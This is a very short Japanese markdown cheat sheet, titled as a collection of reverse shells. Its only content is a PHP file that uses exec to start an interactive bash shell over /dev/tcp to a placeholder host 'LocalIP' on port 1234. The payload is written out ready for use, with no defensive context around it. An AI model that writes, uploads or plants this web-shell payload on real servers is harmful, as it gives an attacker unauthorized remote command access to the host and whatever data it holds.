## リバースシェル集

#### リバースシェル用のphpファイル  
``` 
<?php

exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/LocalIP/1234 0>&1'");

?> 
```
